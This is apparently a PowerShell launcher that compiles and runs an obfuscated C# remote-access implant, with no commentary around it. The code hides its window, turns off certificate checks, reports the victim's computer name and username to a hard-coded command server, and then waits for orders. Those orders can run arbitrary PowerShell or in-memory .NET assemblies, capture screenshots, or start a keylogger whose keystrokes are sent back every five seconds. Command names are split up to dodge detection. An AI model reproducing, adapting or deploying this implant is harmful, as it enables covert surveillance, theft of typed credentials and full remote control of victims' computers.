$Fjqa = 'using System;using System.Drawing;using System.Drawing.Imaging;using System.Threading;using System.Collections.Generic;using System.Windows.Forms;using System.Text;using System.Management.Automation;using System.Collections.ObjectModel;using System.Management.Automation.Runspaces;using System.Net;using System.Net.Security;using System.Diagnostics;using System.IO;using System.Security.Cryptography.X509Certificates;using System.Web.Script.Serialization;using System.Runtime.InteropServices;using System.Timers;using System.Reflection;using System.Linq;namespace AkLG{public class qqQYqwz{static qqQYqwz(){} public string UUID{get;set;}public string ID{get;set;}public string Data{get;set;}}public class TrustAllCertsPolicy : ICertificatePolicy{public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem){return true;}}public class lnHQQ{[DllImport("user32.dll")]static extern bool ShowWindow(IntPtr UhPpeBlTERBou, UInt32 DNWENAVQ);[DllImport("kernel32.dll")]static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]static extern short GetAsyncKeyState(int piGpMGFsdN);[DllImport("user32.dll")]static extern IntPtr GetForegroundWindow();[DllImport("user32.dll")]static extern int GetWindowText(IntPtr UDGrBmjNADbqnh, StringBuilder qTNkcCeSUWrh, int ERuBXN);[DllImport("user32.dll")]static extern int GetWindowTextLength(IntPtr ZhDjtfMSdW);private static Bitmap EGenJWlC;private static Graphics LCIePD;private static String cjhN = "";private static int ITZXoK = 0;private static string nnwqpR;private static string kfptNEhVZHx;private static byte[] oeWdJeiRByJTy;private static int wfMc;private static string ImXCQaDkMhtWAt;private static int ddVwryN;private static StringBuilder fyjlJiQxEFXI = new StringBuilder();public static void Main(){ShowWindow(GetConsoleWindow(), 0);}protected static void nhuXZ(){foreach (Screen TvNztBtgiLhUptj in Screen.AllScreens){ITZXoK += 1;EGenJWlC = new Bitmap(TvNztBtgiLhUptj.Bounds.Width, TvNztBtgiLhUptj.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);LCIePD = Graphics.FromImage(EGenJWlC);LCIePD.CopyFromScreen(TvNztBtgiLhUptj.Bounds.X, TvNztBtgiLhUptj.Bounds.Y, 0, 0, TvNztBtgiLhUptj.Bounds.Size, CopyPixelOperation.SourceCopy);using (MemoryStream SHPVjjTP = new MemoryStream()){EGenJWlC.Save(SHPVjjTP, ImageFormat.Png);cjhN = Convert.ToBase64String(SHPVjjTP.ToArray());string drnQdJCz = String.Format("screenshot {0}", cjhN);SGajBkKBc(drnQdJCz, Guid.NewGuid().ToString());}}}protected static string FFHyqpZJvKSlQSz(){var FipMpigz = "";var DBPpudEOBocud = GetForegroundWindow();var unzwMsvBXFAymc = GetWindowTextLength(DBPpudEOBocud) + 1;var cqpeiLiVIs = new StringBuilder(unzwMsvBXFAymc);if (GetWindowText(DBPpudEOBocud, cqpeiLiVIs, unzwMsvBXFAymc) > 0){FipMpigz = cqpeiLiVIs.ToString();}return FipMpigz;}protected static void cqpeiLiVIs(object kLnlHR, ElapsedEventArgs MVPBtDrHKp){if (fyjlJiQxEFXI.Length != 0){byte[] izBBzpy = Encoding.ASCII.GetBytes(fyjlJiQxEFXI.ToString());string QVdY = String.Format("userinput {0}", Convert.ToBase64String(izBBzpy));SGajBkKBc(QVdY, Guid.NewGuid().ToString());}fyjlJiQxEFXI.Clear();}protected static void xAoom(){System.Timers.Timer fySRHaDBTq = new System.Timers.Timer();fySRHaDBTq.Elapsed += new ElapsedEventHandler(cqpeiLiVIs);fySRHaDBTq.Interval = 5000;fySRHaDBTq.Enabled = true;string rNFrTOhboWJIo = FFHyqpZJvKSlQSz();string IyVVaIBjocg = rNFrTOhboWJIo;while (true){foreach (int hgVVbl in Enum.GetValues(typeof(Keys))){int KtUzOIlyCtHIP = GetAsyncKeyState(hgVVbl);if (KtUzOIlyCtHIP == -32767){var wwhHPmUANBYcB = Enum.GetName(typeof(Keys), hgVVbl).ToLower();if (hgVVbl == 1 || hgVVbl == 2){string ngWXlosNEBiGdA = FFHyqpZJvKSlQSz();if (IyVVaIBjocg != ngWXlosNEBiGdA){fyjlJiQxEFXI.Append(String.Format("\n- {0}\n----\n", ngWXlosNEBiGdA));IyVVaIBjocg = ngWXlosNEBiGdA;}}else if (Control.ModifierKeys == Keys.Shift){if (hgVVbl == 8){fyjlJiQxEFXI.Append("[BackSpace]");}else if (hgVVbl == 9){fyjlJiQxEFXI.Append("[Tab]");}else if (hgVVbl == 13){fyjlJiQxEFXI.Append("[Enter]");}else if (hgVVbl == 27){fyjlJiQxEFXI.Append("[Esc]");}else if (hgVVbl == 32){fyjlJiQxEFXI.Append(" ");}else if (hgVVbl == 48){fyjlJiQxEFXI.Append(")");}else if (hgVVbl == 49){fyjlJiQxEFXI.Append("!");}else if (hgVVbl == 50){fyjlJiQxEFXI.Append("@");}else if (hgVVbl == 51){fyjlJiQxEFXI.Append("#");}else if (hgVVbl == 52){fyjlJiQxEFXI.Append("$");}else if (hgVVbl == 53){fyjlJiQxEFXI.Append("%");}else if (hgVVbl == 54){fyjlJiQxEFXI.Append("^");}else if (hgVVbl == 55){fyjlJiQxEFXI.Append("&");}else if (hgVVbl == 56){fyjlJiQxEFXI.Append("*");}else if (hgVVbl == 57){fyjlJiQxEFXI.Append("(");}else if (hgVVbl >= 65 && hgVVbl <= 90){fyjlJiQxEFXI.Append(wwhHPmUANBYcB.ToUpper());}else if (hgVVbl >= 96 && hgVVbl <= 105){fyjlJiQxEFXI.Append(wwhHPmUANBYcB.ToUpper());}else if (hgVVbl >= 112 && hgVVbl <= 135){fyjlJiQxEFXI.Append(wwhHPmUANBYcB.ToUpper());}else if (hgVVbl == 144){fyjlJiQxEFXI.Append("[NumLock]");}else if (hgVVbl == 186){fyjlJiQxEFXI.Append(":");}else if (hgVVbl == 187){fyjlJiQxEFXI.Append("+");}else if (hgVVbl == 188){fyjlJiQxEFXI.Append("<");}else if (hgVVbl == 189){fyjlJiQxEFXI.Append("_");}else if (hgVVbl == 190){fyjlJiQxEFXI.Append(">");}else if (hgVVbl == 191){fyjlJiQxEFXI.Append("?");}else if (hgVVbl == 192){fyjlJiQxEFXI.Append("~");}else if (hgVVbl == 219){fyjlJiQxEFXI.Append("{");}else if (hgVVbl == 220){fyjlJiQxEFXI.Append("|");}else if (hgVVbl == 221){fyjlJiQxEFXI.Append("}");}else if (hgVVbl == 222){fyjlJiQxEFXI.Append("\"");}}else{if (hgVVbl == 8){fyjlJiQxEFXI.Append("[BackSpace]");}else if (hgVVbl == 9){fyjlJiQxEFXI.Append("[Tab]");}else if (hgVVbl == 13){fyjlJiQxEFXI.Append("[Enter]\n");}else if (hgVVbl == 27){fyjlJiQxEFXI.Append("[Esc]");}else if (hgVVbl == 32){fyjlJiQxEFXI.Append(" ");}else if (hgVVbl == 48){fyjlJiQxEFXI.Append("0");}else if (hgVVbl == 49){fyjlJiQxEFXI.Append("1");}else if (hgVVbl == 50){fyjlJiQxEFXI.Append("2");}else if (hgVVbl == 51){fyjlJiQxEFXI.Append("3");}else if (hgVVbl == 52){fyjlJiQxEFXI.Append("4");}else if (hgVVbl == 53){fyjlJiQxEFXI.Append("5");}else if (hgVVbl == 54){fyjlJiQxEFXI.Append("6");}else if (hgVVbl == 55){fyjlJiQxEFXI.Append("7");}else if (hgVVbl == 56){fyjlJiQxEFXI.Append("8");}else if (hgVVbl == 57){fyjlJiQxEFXI.Append("9");}else if (hgVVbl >= 65 && hgVVbl <= 90){fyjlJiQxEFXI.Append(wwhHPmUANBYcB);}else if (hgVVbl >= 96 && hgVVbl <= 105){fyjlJiQxEFXI.Append(wwhHPmUANBYcB.ToUpper());}else if (hgVVbl >= 112 && hgVVbl <= 135){fyjlJiQxEFXI.Append(wwhHPmUANBYcB.ToUpper());}else if (hgVVbl == 144){fyjlJiQxEFXI.Append("[NumLock]");}else if (hgVVbl == 186){fyjlJiQxEFXI.Append(";");}else if (hgVVbl == 187){fyjlJiQxEFXI.Append("=");}else if (hgVVbl == 188){fyjlJiQxEFXI.Append(",");}else if (hgVVbl == 189){fyjlJiQxEFXI.Append("-");}else if (hgVVbl == 190){fyjlJiQxEFXI.Append(".");}else if (hgVVbl == 191){fyjlJiQxEFXI.Append("/");}else if (hgVVbl == 192){fyjlJiQxEFXI.Append("`");}else if (hgVVbl == 219){fyjlJiQxEFXI.Append("[");}else if (hgVVbl == 220){fyjlJiQxEFXI.Append("\\");}else if (hgVVbl == 221){fyjlJiQxEFXI.Append("]");}else if (hgVVbl == 222){fyjlJiQxEFXI.Append("''");}}break;}}}}public static void mnBVShx(string CuqXqMwFexLl, string Elwt, string ExozzSBlQ){ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate {return true;});nnwqpR = CuqXqMwFexLl;kfptNEhVZHx = kLIFsEBxFIgeVRC(16);oeWdJeiRByJTy = Encoding.ASCII.GetBytes(Elwt);wfMc = 15000;Process mYtQbOej = Process.GetCurrentProcess();ddVwryN = mYtQbOej.Id;try{wfMc = Convert.ToInt32(ExozzSBlQ);}catch { }bool YJrbmzzROnjOGDm = false;string YGfYrTGmfrCVoy = String.Format("register {0} {1}", kfptNEhVZHx, eqkwkudYYyOy());ImXCQaDkMhtWAt = Environment.OSVersion.ToString();SGajBkKBc(YGfYrTGmfrCVoy, null);Thread twqhT = new Thread(() => xAoom());while (!YJrbmzzROnjOGDm){qqQYqwz WihxOhiRWnX = new qqQYqwz();try{Thread.Sleep(wfMc);string PKdAOstbDG = SGajBkKBc(null, null);WihxOhiRWnX = EIfh(PKdAOstbDG);if (WihxOhiRWnX.UUID != null){WihxOhiRWnX.Data = nWSYHRyCrTwXAe(WihxOhiRWnX.Data);string[] XgztkDUZV = BOLNrp(WihxOhiRWnX.Data);if (XgztkDUZV[0].Equals("delay")){wfMc = Convert.ToInt32(XgztkDUZV[1]);}else if (XgztkDUZV[0].Equals("exit")){YJrbmzzROnjOGDm = true;}else if (XgztkDUZV[0].Equals("screenshot")){nhuXZ();}else if (XgztkDUZV[0].Equals("ke" + "y" + "lo" + "gger" + "-start")){twqhT.Start();}else if (XgztkDUZV[0].Equals("ke" + "y" + "lo" + "gger" + "-stop")){if (twqhT.IsAlive){twqhT.Abort();}}else if (XgztkDUZV[0].Equals("do" + "tn" + "et")){Thread ZKhTNRMHAMu = new Thread(() => IWfu(XgztkDUZV[1], WihxOhiRWnX.UUID));ZKhTNRMHAMu.Start();}else{Thread ZKhTNRMHAMu = new Thread(() => BcCvxvWis(WihxOhiRWnX.Data, WihxOhiRWnX.UUID));ZKhTNRMHAMu.Start();}}}catch (Exception qYrGmIS){SGajBkKBc(Convert.ToBase64String(Encoding.UTF8.GetBytes(qYrGmIS.Message)), WihxOhiRWnX.UUID);}}}protected static string[] BOLNrp(string AswbKTSB){return AswbKTSB.Split(new char[] {'' ''},2);}protected static void IWfu(string FriD, string IGobxq){StringWriter lQtXVS = new StringWriter();TextWriter YPgSVywzUSEGpu = Console.Out;Console.SetOut(lQtXVS);StringBuilder CrvSLyH = new StringBuilder();byte[] ENVCqvcjxCgs = Encoding.ASCII.GetBytes(FriD);string WTPJOaISHv = FriD.Split('' '')[0];string[] PiwxpgnCEYCjnB = FriD.Split('' '');if (File.Exists(WTPJOaISHv)){FileStream shhskGYnvPI = new FileStream(WTPJOaISHv, FileMode.Open);BinaryReader GrfM = new BinaryReader(shhskGYnvPI);ENVCqvcjxCgs = GrfM.ReadBytes(Convert.ToInt32(shhskGYnvPI.Length));shhskGYnvPI.Close();GrfM.Close();} else{   ENVCqvcjxCgs = Convert.FromBase64String(PiwxpgnCEYCjnB[0]);}PiwxpgnCEYCjnB = PiwxpgnCEYCjnB.Skip(1).ToArray();Assembly BPyqjXjSlUpPP = Assembly.Load(ENVCqvcjxCgs);MethodInfo zGILhqDzyAZoDIk = BPyqjXjSlUpPP.EntryPoint;CrvSLyH.Append("EntryPoint is " + zGILhqDzyAZoDIk + Environment.NewLine);if (zGILhqDzyAZoDIk != null){CrvSLyH.Append("Passing args: " + String.Join(" ", PiwxpgnCEYCjnB) + Environment.NewLine);object o = BPyqjXjSlUpPP.CreateInstance(zGILhqDzyAZoDIk.Name);List<string> SmGpMPIN = new List<string>(PiwxpgnCEYCjnB);zGILhqDzyAZoDIk.Invoke(null, new[] { (object[]) SmGpMPIN.ToArray()});}Console.SetOut(YPgSVywzUSEGpu);CrvSLyH.Append(lQtXVS.ToString());lQtXVS.Close();SGajBkKBc(Convert.ToBase64String(Encoding.UTF8.GetBytes(CrvSLyH.ToString())), IGobxq);}protected static string nWSYHRyCrTwXAe(string mvxdQKrWtecL){byte[] XcAnkdn = Convert.FromBase64String(mvxdQKrWtecL);return Encoding.ASCII.GetString(XcAnkdn);}protected static qqQYqwz EIfh(string YtGwNjUsBShDA){var piGpMGFsdN = new JavaScriptSerializer();piGpMGFsdN.MaxJsonLength = Int32.MaxValue;qqQYqwz qOssAGuicRnmXy = piGpMGFsdN.Deserialize<qqQYqwz>(YtGwNjUsBShDA);return qOssAGuicRnmXy;}protected static string eqkwkudYYyOy(){string ZBtWdACxy = String.Format("{0} {1}\\{2}", Environment.GetEnvironmentVariable("COMPUTERNAME"), Environment.GetEnvironmentVariable("USERDOMAIN"), Environment.GetEnvironmentVariable("USERNAME"));return ZBtWdACxy;}protected static string kLIFsEBxFIgeVRC(int NhufIheXfYzuSIF){StringBuilder gHKp = new StringBuilder();string MOFHpsbyKpv = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";Int32 ChgbPxT = (Int32)(DateTime.Now.Subtract(new DateTime(1970, 1, 1))).TotalSeconds;Process BSiAhu = Process.GetCurrentProcess();Random hCpzxXhtTfxVxqE = new Random(BSiAhu.Id ^ ChgbPxT);if (NhufIheXfYzuSIF == 0){NhufIheXfYzuSIF = hCpzxXhtTfxVxqE.Next(1, 16);}for (int fwWXSMrUoCAt = 0; fwWXSMrUoCAt < NhufIheXfYzuSIF; fwWXSMrUoCAt++){gHKp.Append(MOFHpsbyKpv[hCpzxXhtTfxVxqE.Next(MOFHpsbyKpv.Length - 1)]);}ddVwryN = hCpzxXhtTfxVxqE.Next();return gHKp.ToString();}protected static void BcCvxvWis(string ZVNgxBmn, string zIIbPRbsU){string FStVAP;StringBuilder WFsEYbSn = new StringBuilder();try{Runspace xDSOzJqR = RunspaceFactory.CreateRunspace();xDSOzJqR.Open();RunspaceInvoke AxxTWXXOqhkP = new RunspaceInvoke(xDSOzJqR);Pipeline IQRFbKNae = xDSOzJqR.CreatePipeline();IQRFbKNae.Commands.AddScript(ZVNgxBmn);IQRFbKNae.Commands.Add("Out-String");Collection<PSObject> hnuyLZRMpxh = IQRFbKNae.Invoke();xDSOzJqR.Close();foreach (PSObject XNjIdZE in hnuyLZRMpxh){WFsEYbSn.AppendLine(XNjIdZE.ToString());}FStVAP = WFsEYbSn.ToString();}catch (Exception IIRi){FStVAP = IIRi.ToString();}SGajBkKBc(Convert.ToBase64String(Encoding.UTF8.GetBytes(FStVAP)), zIIbPRbsU);}protected static string SGajBkKBc(string sseRKrQfsvZWj, string fYzmTAscoU){byte[] CBJUqfdstzrnAYu;if (sseRKrQfsvZWj != null){CBJUqfdstzrnAYu = Encoding.UTF8.GetBytes(sseRKrQfsvZWj);}else{CBJUqfdstzrnAYu = new byte[0];}string ExFfar = String.Format("{0}/{1}/", nnwqpR, kLIFsEBxFIgeVRC(0));HttpWebRequest ERWidS = (HttpWebRequest)WebRequest.Create(ExFfar);ERWidS.Method = "POST";ERWidS.UserAgent = ImXCQaDkMhtWAt;ERWidS.Timeout = 120000;ERWidS.Host = "10.100.0.70:8080";ERWidS.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;Stream tJnwhtj = null;StreamReader DxQpx = null;string KCTuc;string VBvMDTc = "";if (CBJUqfdstzrnAYu.Length > 0){VBvMDTc = Convert.ToBase64String(CBJUqfdstzrnAYu);}qqQYqwz AWTj = new qqQYqwz{UUID = fYzmTAscoU,ID = kfptNEhVZHx,Data = VBvMDTc};var bhqCkNfZzU = new JavaScriptSerializer();bhqCkNfZzU.MaxJsonLength = Int32.MaxValue;var jNmsRSfRVx = bhqCkNfZzU.Serialize(AWTj).ToString();ERWidS.ContentType = "application/json";ERWidS.ContentLength = jNmsRSfRVx.Length;try{tJnwhtj = ERWidS.GetRequestStream();tJnwhtj.Write(Encoding.UTF8.GetBytes(jNmsRSfRVx), 0, jNmsRSfRVx.Length);}catch (Exception qYrGmIS){SGajBkKBc(Convert.ToBase64String(Encoding.UTF8.GetBytes(qYrGmIS.Message)), fYzmTAscoU);}finally{if (tJnwhtj != null){tJnwhtj.Dispose();}}try{tJnwhtj = ERWidS.GetResponse().GetResponseStream();DxQpx = new StreamReader(tJnwhtj);KCTuc = DxQpx.ReadToEnd();}catch (Exception Ddaww0){Console.Write(Ddaww0.Message + "\n");KCTuc = "";}return KCTuc.ToString();}}public class ExozzSBlQ{public static byte[] mYtQbOej(byte[] YJrbmzzROnjOGDm, byte[] YGfYrTGmfrCVoy){int eqkwkudYYyOy,SGajBkKBc,PKdAOstbDG,WihxOhiRWnX,EIfh;int[] nWSYHRyCrTwXAe,XgztkDUZV;byte[] BOLNrp;nWSYHRyCrTwXAe = new int[256];XgztkDUZV = new int[256];BOLNrp = new byte[YGfYrTGmfrCVoy.Length];for (SGajBkKBc = 0; SGajBkKBc < 256; SGajBkKBc++){nWSYHRyCrTwXAe[SGajBkKBc] = YJrbmzzROnjOGDm[SGajBkKBc % YJrbmzzROnjOGDm.Length];XgztkDUZV[SGajBkKBc] = SGajBkKBc;}for (PKdAOstbDG = SGajBkKBc = 0; SGajBkKBc < 256; SGajBkKBc++){PKdAOstbDG = (PKdAOstbDG + XgztkDUZV[SGajBkKBc] + nWSYHRyCrTwXAe[SGajBkKBc]) % 256;EIfh = XgztkDUZV[SGajBkKBc];XgztkDUZV[SGajBkKBc] = XgztkDUZV[PKdAOstbDG];XgztkDUZV[PKdAOstbDG] = EIfh;}for (eqkwkudYYyOy = PKdAOstbDG = SGajBkKBc = 0; SGajBkKBc < YGfYrTGmfrCVoy.Length; SGajBkKBc++){eqkwkudYYyOy++;eqkwkudYYyOy %= 256;PKdAOstbDG += XgztkDUZV[eqkwkudYYyOy];PKdAOstbDG %= 256;EIfh = XgztkDUZV[eqkwkudYYyOy];XgztkDUZV[eqkwkudYYyOy] = XgztkDUZV[PKdAOstbDG];XgztkDUZV[PKdAOstbDG] = EIfh;WihxOhiRWnX = XgztkDUZV[((XgztkDUZV[eqkwkudYYyOy] + XgztkDUZV[PKdAOstbDG]) % 256)];BOLNrp[SGajBkKBc] = (byte)(YGfYrTGmfrCVoy[SGajBkKBc] ^ WihxOhiRWnX);}return BOLNrp;}public static byte[] BcCvxvWis(byte[] ZKhTNRMHAMu, byte[] AswbKTSB){try{return mYtQbOej(ZKhTNRMHAMu, AswbKTSB);}catch{return new byte[0];}}}}'; Add-Type -ReferencedAssemblies "System.Drawing.dll","System.Web.Extensions.dll","System.Windows.Forms.dll" -TypeDefinition $Fjqa -Language CSharp; [AkLG.lnHQQ]::mnBVShx("http://27.21.12.21:80", "LTwCoYPKGOZCWgCuikuOpNEw", "15000")
